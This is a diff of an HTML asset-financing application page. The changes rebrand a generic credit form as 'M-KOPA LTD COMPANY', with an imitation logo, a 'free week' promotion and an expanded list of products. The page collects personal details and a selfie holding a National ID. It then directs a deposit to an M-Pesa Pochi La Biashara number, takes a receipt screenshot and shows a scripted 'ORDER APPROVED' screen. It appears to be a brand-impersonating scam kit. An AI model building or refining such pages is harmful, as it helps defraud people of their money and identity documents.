@@ -3,11 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Karibu Credit - Asset Financing Application</title>
+    <title>M-KOPA LTD COMPANY - Asset Financing</title>
     <style>
         :root {
-            --primary: #008744;
-            --primary-dark: #006633;
+            --primary: #8cc63f; /* M-KOPA Green */
+            --primary-dark: #6e9d30;
+            --secondary: #1a1a1a;
             --bg: #f4f7f6;
             --text: #1e293b;
             --border: #cbd5e1;
@@ -20,46 +21,46 @@
         .container { width: 100%; max-width: 650px; background: var(--card-bg); border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.08); padding: 25px; height: fit-content; }
         
         header { text-align: center; margin-bottom: 25px; border-bottom: 2px solid #e2e8f0; padding-bottom: 15px; }
-        header h1 { color: var(--primary); font-size: 1.6rem; font-weight: 700; margin-bottom: 4px; }
-        header p { color: #64748b; font-size: 0.9rem; }
+        .logo-container { display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 8px; }
+        .mkopa-logo { width: 45px; height: 45px; }
+        header h1 { color: var(--secondary); font-size: 1.6rem; font-weight: 800; letter-spacing: -0.5px; }
+        header p { color: #64748b; font-size: 0.85rem; font-weight: 600; }
+
+        /* Promotional Banner */
+        .promo-banner { background: #ecfdf5; border: 1.5px solid #10b981; border-radius: 8px; padding: 10px 14px; text-align: center; margin-bottom: 20px; color: #065f46; font-size: 0.88rem; font-weight: 600; }
+        .promo-banner span { background: #10b981; color: white; padding: 2px 8px; border-radius: 12px; font-size: 0.75rem; margin-right: 6px; text-transform: uppercase; font-weight: bold; }
 
         /* Horizontal Stepper */
         .stepper-horizontal { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; position: relative; }
         .step-item { display: flex; flex-direction: column; align-items: center; z-index: 2; flex: 1; text-align: center; }
-        .step-circle { width: 32px; height: 32px; border-radius: 50%; background: #e2e8f0; color: #64748b; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 0.85rem; margin-bottom: 6px; transition: all 0.3s ease; }
-        .step-label { font-size: 0.75rem; color: #64748b; font-weight: 600; }
-        .step-line { flex-grow: 1; height: 3px; background: #e2e8f0; margin: 0 -10px 20px -10px; z-index: 1; }
+        .step-circle { width: 28px; height: 28px; border-radius: 50%; background: #e2e8f0; color: #64748b; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 0.8rem; margin-bottom: 4px; transition: all 0.3s ease; }
+        .step-label { font-size: 0.7rem; color: #64748b; font-weight: 600; }
+        .step-line { flex-grow: 1; height: 3px; background: #e2e8f0; margin: 0 -8px 16px -8px; z-index: 1; }
 
-        .step-item.active .step-circle { background: var(--primary); color: #fff; box-shadow: 0 0 0 4px rgba(0, 135, 68, 0.15); }
-        .step-item.active .step-label { color: var(--primary); }
-        .step-item.completed .step-circle { background: var(--primary); color: #fff; }
+        .step-item.active .step-circle { background: var(--primary); color: #fff; box-shadow: 0 0 0 3px rgba(140, 198, 63, 0.25); }
+        .step-item.active .step-label { color: var(--secondary); font-weight: 700; }
+        .step-item.completed .step-circle { background: var(--primary-dark); color: #fff; }
 
         /* Forms & Cards */
         .form-stage { display: none; }
         .form-stage.active { display: block; animation: fadeIn 0.3s ease-in-out; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
 
-        h2 { font-size: 1.2rem; color: #0f172a; margin-bottom: 15px; }
-        
-        .product-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 15px; }
-        .product-card { border: 2px solid var(--border); border-radius: 8px; padding: 12px; cursor: pointer; transition: all 0.2s; display: block; position: relative; background: #fff; }
-        .product-card input[type="radio"] { position: absolute; top: 10px; right: 10px; accent-color: var(--primary); }
-        .product-card:hover { border-color: var(--primary); }
-        .product-card .icon { font-size: 1.5rem; display: block; margin-bottom: 5px; }
-        .product-card h3 { font-size: 0.95rem; color: #0f172a; margin-bottom: 4px; }
-        .product-card .model-tag { font-size: 0.7rem; background: #e0f2fe; color: #0369a1; padding: 2px 6px; border-radius: 4px; display: inline-block; margin-bottom: 6px; }
-        .product-card .deposit-text { font-size: 0.85rem; font-weight: bold; color: var(--primary); }
+        h2 { font-size: 1.15rem; color: #0f172a; margin-bottom: 15px; border-left: 4px solid var(--primary); padding-left: 8px; }
 
         .input-group { margin-bottom: 16px; text-align: left; }
         .input-group label { display: block; font-size: 0.85rem; font-weight: 600; color: #334155; margin-bottom: 6px; }
-        .input-group input { width: 100%; padding: 10px 12px; border: 1.5px solid var(--border); border-radius: 6px; font-size: 0.95rem; outline: none; transition: border-color 0.2s; }
-        .input-group input:focus { border-color: var(--primary); }
+        .input-group input, .input-group select { width: 100%; padding: 10px 12px; border: 1.5px solid var(--border); border-radius: 6px; font-size: 0.95rem; outline: none; transition: border-color 0.2s; background: #fff; }
+        .input-group input:focus, .input-group select:focus { border-color: var(--primary); }
         
-        .pochi-box { background: #f0fdf4; border: 2px dashed var(--primary); border-radius: 8px; padding: 16px; text-align: center; margin-bottom: 20px; }
-        .pochi-number-display { font-size: 1.5rem; font-weight: 800; color: var(--primary); letter-spacing: 1px; margin: 8px 0; }
+        .pochi-box { background: #f7fee7; border: 2px dashed var(--primary); border-radius: 8px; padding: 16px; text-align: center; margin-bottom: 20px; }
+        .pochi-number-display { font-size: 1.5rem; font-weight: 800; color: #365314; letter-spacing: 1px; margin: 8px 0; }
 
-        .btn-primary { width: 100%; background: var(--primary); color: white; border: none; padding: 12px; border-radius: 6px; font-size: 1rem; font-weight: 600; cursor: pointer; transition: background 0.2s; }
-        .btn-primary:hover { background: var(--primary-dark); }
+        .repayment-box { background: #f0fdf4; border: 1.5px solid #16a34a; border-radius: 8px; padding: 14px; text-align: center; margin: 12px 0; }
+        .free-tag { display: inline-block; background: #16a34a; color: white; padding: 4px 12px; border-radius: 20px; font-size: 0.85rem; font-weight: bold; margin-bottom: 6px; }
+
+        .btn-primary { width: 100%; background: var(--primary); color: #1a1a1a; border: none; padding: 12px; border-radius: 6px; font-size: 1rem; font-weight: 700; cursor: pointer; transition: background 0.2s; }
+        .btn-primary:hover { background: var(--primary-dark); color: #fff; }
         .btn-secondary { background: #0284c7; color: white; border: none; padding: 8px 14px; border-radius: 5px; font-weight: 600; cursor: pointer; margin-top: 6px; display: inline-block; text-decoration: none; font-size: 0.85rem; }
 
         .stk-card { text-align: center; padding: 20px 10px; }
@@ -69,41 +70,64 @@
 
         .success-card { text-align: center; padding: 20px 0; }
         .celebration-icon { font-size: 3rem; margin-bottom: 10px; }
-
-        @media (max-width: 480px) {
-            .product-grid { grid-template-columns: 1fr; }
-        }
     </style>
 </head>
 <body>
     <div class="container">
         <header>
-            <h1>💚 Karibu Asset Credit</h1>
-            <p>Fast & reliable Lipa Polepole asset financing</p>
+            <div class="logo-container">
+                <svg class="mkopa-logo" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="50" cy="50" r="48" fill="#1A1A1A"/>
+                    <path d="M25 70V30L45 50L65 30V70" stroke="#8CC63F" stroke-width="10" stroke-linecap="round" stroke-linejoin="round"/>
+                    <circle cx="75" cy="35" r="7" fill="#8CC63F"/>
+                </svg>
+                <h1>M-KOPA LTD COMPANY</h1>
+            </div>
+            <p>Upgrade Your Life | Lipa Polepole Asset Financing</p>
         </header>
 
-        <!-- Horizontal Stepper (5 Steps) -->
+        <!-- 1 Week Free Promo Banner -->
+        <div class="promo-banner">
+            <span>Special Offer</span> 🎉 Get <strong>1 Week FREE Usage</strong> with 0 KES daily payment for the first 7 days!
+        </div>
+
+        <!-- Horizontal Stepper -->
         <div class="stepper-horizontal">
-            <div class="step-item active" id="step-indicator-1"><div class="step-circle">1</div><div class="step-label">Model</div></div>
+            <div class="step-item active" id="step-indicator-1"><div class="step-circle">1</div><div class="step-label">Item</div></div>
             <div class="step-line"></div>
             <div class="step-item" id="step-indicator-2"><div class="step-circle">2</div><div class="step-label">Info</div></div>
             <div class="step-line"></div>
             <div class="step-item" id="step-indicator-3"><div class="step-circle">3</div><div class="step-label">Selfie</div></div>
             <div class="step-line"></div>
-            <div class="step-item" id="step-indicator-4"><div class="step-circle">4</div><div class="step-label">Payment</div></div>
+            <div class="step-item" id="step-indicator-4"><div class="step-circle">4</div><div class="step-label">Submit</div></div>
             <div class="step-line"></div>
-            <div class="step-item" id="step-indicator-5"><div class="step-circle">5</div><div class="step-label">Verify</div></div>
+            <div class="step-item" id="step-indicator-5"><div class="step-circle">5</div><div class="step-label">Deposit</div></div>
         </div>
 
         <form id="credit-form">
-            <!-- STAGE 1: Model Selection -->
+            <!-- STAGE 1: Product Selection -->
             <div class="form-stage active" id="stage-1">
-                <h2>1. Choose Brand & Latest Model</h2>
-                <div class="product-grid">
-                    <label class="product-card"><input type="radio" name="product" value="Samsung Galaxy A17" data-category="Smartphone" data-price="2500" required><div class="card-content"><span class="icon">📱</span><h3>Samsung Galaxy A17</h3><p class="model-tag">Latest Model</p><p class="deposit-text">Deposit: KES 2,500</p></div></label>
-                    <label class="product-card"><input type="radio" name="product" value="Tecno Spark 30 Pro" data-category="Smartphone" data-price="2200"><div class="card-content"><span class="icon">📱</span><h3>Tecno Spark 30 Pro</h3><p class="model-tag">Latest Model</p><p class="deposit-text">Deposit: KES 2,200</p></div></label>
-                    <label class="product-card"><input type="radio" name="product" value="TVS HLX 150 Boda" data-category="Motorcycle" data-price="15000"><div class="card-content"><span class="icon">🏍️</span><h3>TVS HLX 150 Boda</h3><p class="model-tag">Latest 5-Speed</p><p class="deposit-text">Deposit: KES 15,000</p></div></label>
-                    <label class="product-card"><input type="radio" name="product" value="Roam Air Electric" data-category="Motorcycle" data-price="12000"><div class="card-content"><span class="icon">⚡</span><h3>Roam Air Electric</h3><p class="model-tag">Battery Swap Ready</p><p class="deposit-text">Deposit: KES 12,000</p></div></label>
+                <h2>1. Select Asset Category & Model</h2>
+                
+                <div class="input-group">
+                    <label for="productCategory">Choose Category:</label>
+                    <select id="productCategory">
+                        <option value="">-- Select Category --</option>
+                        <option value="Furniture">Furniture & Living (Sofasets, Beds, Dining)</option>
+                        <option value="Water Tanks">Water Storage Tanks & Sanitation</option>
+                        <option value="Electrical Accessories">Electrical Accessories & Wiring</option>
+                        <option value="Jewelry">Jewelry & Precious Metals</option>
+                        <option value="Solar & Energy">M-KOPA Solar & Power Systems</option>
+                        <option value="Electronics & Mobile">Smartphones, TVs & Appliances</option>
+                        <option value="Motorbikes & Mobility">Motorbikes & Electric Mobility</option>
+                    </select>
+                </div>
+
+                <div class="input-group" id="itemSelectGroup" style="display: none;">
+                    <label for="productItem">Choose Item Model / Specification:</label>
+                    <select id="productItem">
+                        <option value="">-- Select Item --</option>
+                    </select>
                 </div>
             </div>
 
@@ -117,83 +141,101 @@
 
             <!-- STAGE 3: Identity Verification Selfie -->
             <div class="form-stage" id="stage-3">
-                <h2>3. Identity Verification Photo</h2>
-                <p style="font-size: 0.85rem; color: #64748b; margin-bottom: 15px;">Please take or upload a photo of yourself holding your National ID to confirm your identity.</p>
+                <h2>3. Verification Photo (Selfie)</h2>
+                <p style="font-size: 0.85rem; color: #64748b; margin-bottom: 15px;">Please upload a clear selfie photo holding your National ID to confirm your account.</p>
                 <div class="input-group">
                     <label>Upload Verification Selfie</label>
                     <input type="file" id="selfiePhoto" accept="image/*" capture="user" required>
-                    <small id="selfie-error" style="color: #dc2626; display: none; margin-top: 5px;">⚠️ Please upload a selfie photo to proceed.</small>
                 </div>
                 <div id="selfie-preview-container" style="display: none; text-align: center; margin-top: 15px;">
-                    <p style="font-weight: 600; color: #008744; font-size: 0.85rem;">Preview:</p>
-                    <img id="selfie-preview" src="" alt="Selfie Preview" style="max-width: 180px; max-height: 180px; border-radius: 8px; border: 2px solid #008744; margin-top: 5px;">
+                    <p style="font-weight: 600; color: #8cc63f; font-size: 0.85rem;">Selfie Attached:</p>
+                    <img id="selfie-preview" src="" alt="Selfie Preview" style="max-width: 180px; max-height: 180px; border-radius: 8px; border: 2px solid #8cc63f; margin-top: 5px;">
                 </div>
             </div>
 
-            <!-- STAGE 4: Payment & Screenshot Upload -->
+            <!-- STAGE 4: General Customer Title -->
             <div class="form-stage" id="stage-4">
-                <h2>4. Deposit Payment & Screenshot Confirmation</h2>
+                <h2>4. Complete Application Registration</h2>
+                <div class="stk-card">
+                    <p style="font-size: 0.9rem; color: #475569; margin-bottom: 15px;">Please verify and save your details to proceed to deposit payment.</p>
+                    <button type="button" id="submit-profile-btn" class="btn-primary">Save & Continue to Payment</button>
+                </div>
+            </div>
+
+            <!-- STAGE 5: Deposit Payment & Receipt Upload -->
+            <div class="form-stage" id="stage-5">
+                <h2>5. M-KOPA Deposit Payment</h2>
                 <div class="pochi-box">
-                    <p style="font-size: 0.85rem; color: #334155;">Selected Product: <strong id="selected-model-title" style="color:#008744;">Model</strong></p>
-                    <p style="font-size: 0.85rem; color: #334155; margin-top: 4px;">Send Deposit via M-Pesa Pochi La Biashara To:</p>
+                    <p style="font-size: 0.85rem; color: #334155;">Selected Product: <strong id="selected-model-title" style="color:#6e9d30;">Model</strong></p>
+                    
+                    <div class="repayment-box">
+                        <span class="free-tag">🎁 1 WEEK FREE TRIAL INCLUDED</span>
+                        <p style="font-size: 0.95rem; color: #15803d; font-weight: 700; margin-top: 4px;">Days 1–7: KES 0 / day (FREE)</p>
+                        <p style="font-size: 0.85rem; color: #475569; margin-top: 2px;">Regular Installment: <span id="daily-pay-display" style="font-weight: bold;">KES 0 / day</span> (Starts Day 8)</p>
+                    </div>
+
+                    <p style="font-size: 0.85rem; color: #334155; margin-top: 8px;">Send Deposit via M-Pesa Pochi La Biashara To:</p>
                     <div class="pochi-number-display" id="pochi-number">0757648339</div>
                     
                     <button type="button" id="copy-pochi-btn" class="btn-secondary">📋 Copy Payment Number</button>
-                    <span id="copy-status-msg" style="display: block; color: #008744; font-size: 0.8rem; font-weight: 600; margin-top: 6px;"></span>
+                    <span id="copy-status-msg" style="display: block; color: #16a34a; font-size: 0.8rem; font-weight: 600; margin-top: 6px;"></span>
 
                     <div class="input-group" style="margin-top: 15px;">
                         <label>Your Paying M-Pesa Number</label>
                         <input type="tel" id="walletNumber" placeholder="07XXXXXXXX" required>
                     </div>
                     <div class="input-group">
-                        <label>Deposit Amount (KES)</label>
+                        <label>Required Deposit (KES)</label>
                         <input type="number" id="depositAmount" readonly>
                     </div>
                 </div>
 
                 <div class="input-group" style="background: #ffffff; border: 1.5px solid var(--border); border-radius: 8px; padding: 12px; margin-bottom: 20px;">
-                    <label style="color: #008744; font-weight: 700;">📸 Upload Payment Receipt / M-Pesa Screenshot</label>
-                    <p style="font-size: 0.8rem; color: #64748b; margin-bottom: 10px;">Please attach the screenshot or M-Pesa SMS confirmation receipt for verification.</p>
+                    <label style="color: #6e9d30; font-weight: 700;">📸 Attach Payment Screenshot / M-Pesa SMS Receipt</label>
                     <input type="file" id="paymentScreenshot" accept="image/*" required>
                     <div id="payment-screenshot-preview-container" style="display: none; text-align: center; margin-top: 10px;">
-                        <img id="payment-screenshot-preview" src="" alt="Payment Receipt Preview" style="max-width: 180px; max-height: 180px; border-radius: 8px; border: 2px solid #008744;">
+                        <img id="payment-screenshot-preview" src="" alt="Payment Receipt Preview" style="max-width: 180px; max-height: 180px; border-radius: 8px; border: 2px solid #8cc63f;">
                     </div>
                 </div>
 
-                <button type="button" id="i-have-paid-btn" class="btn-primary">Submit Application & Verify Payment</button>
+                <button type="button" id="i-have-paid-btn" class="btn-primary">Submit Receipt & Complete Order</button>
             </div>
 
-            <!-- STAGE 5: Clean Processing & Fast Verification View -->
-            <div class="form-stage" id="stage-5">
-                <h2>5. Processing Application</h2>
+            <!-- STAGE 6: Countdown & Verification -->
+            <div class="form-stage" id="stage-6">
+                <h2>6. Payment Verification</h2>
 
                 <div id="admin-photo-container" style="display: none; margin-bottom: 20px; text-align: center;">
-                    <p style="font-weight: 600; color: #008744; margin-bottom: 8px;">📸 Dispatch Unit Photo:</p>
-                    <img id="item-live-photo" src="" alt="Item Photo" style="max-width: 100%; max-height: 250px; border-radius: 8px; border: 2px solid #008744;">
+                    <p style="font-weight: 600; color: #6e9d30; margin-bottom: 8px;">📸 M-KOPA Dispatch Unit Image:</p>
+                    <img id="item-live-photo" src="" alt="Item Photo" style="max-width: 100%; max-height: 250px; border-radius: 8px; border: 2px solid #8cc63f;">
                 </div>
 
                 <div class="stk-card" id="countdown-card">
-                    <h3>Submitting Details...</h3>
+                    <h3>Verifying Order Details...</h3>
                     <div class="spinner-box">
                         <div class="spinner"></div>
-                        <h1 id="countdown-timer" style="font-size: 2.8rem; color: #008744; margin: 12px 0;">3</h1>
-                        <p style="font-size: 0.85rem; color: #64748b;">Fast-transmitting your application and payment receipt...</p>
+                        <h1 id="countdown-timer" style="font-size: 2.8rem; color: #8cc63f; margin: 12px 0;">3</h1>
                     </div>
                 </div>
                 
                 <div class="stk-card" id="verification-card" style="display: none;">
-                    <h3>Awaiting Verification</h3>
-                    <p style="font-size: 0.9rem; color: #475569; margin-top: 10px;">Application submitted successfully! Please wait while your payment and personal details are verified.</p>
+                    <h3>Awaiting System Verification</h3>
+                    <p style="font-size: 0.9rem; color: #475569; margin-top: 10px;">Your payment receipt was sent. Please wait while your order is verified.</p>
                     <div class="spinner-box"><div class="spinner"></div></div>
                 </div>
             </div>
 
-            <!-- STAGE 6: Success Page -->
-            <div class="form-stage" id="stage-6">
+            <!-- STAGE 7: Success Page -->
+            <div class="form-stage" id="stage-7">
                 <div class="success-card">
                     <div class="celebration-icon">🎊 🥳</div>
-                    <h2 style="color: #008744;">PAYMENT APPROVED!</h2>
-                    <p style="color: #334155; margin-top: 8px;">Your deposit for <strong id="success-model-name">model</strong> has been verified. Delivery is scheduled for your address shortly.</p>
+                    <h2 style="color: #6e9d30;">M-KOPA ORDER APPROVED!</h2>
+                    <p style="color: #334155; margin-top: 8px;">Your payment for <strong id="success-model-name">model</strong> has been verified.</p>
+                    <div style="background: #f7fee7; border: 1.5px solid #8cc63f; border-radius: 8px; padding: 15px; margin-top: 15px; font-size: 0.9rem; color: #365314; text-align: left;">
+                        <h3 style="color: #15803d; font-size: 1rem; margin-bottom: 6px;">🎁 7-Day Free Trial Activated!</h3>
+                        <p>• <strong>Week 1 (Days 1–7):</strong> KES 0 / day (Completely Free)</p>
+                        <p>• <strong>From Day 8 Onwards:</strong> <span id="success-daily-rate">KES 0</span> / day</p>
+                    </div>
                 </div>
             </div>
         </form>
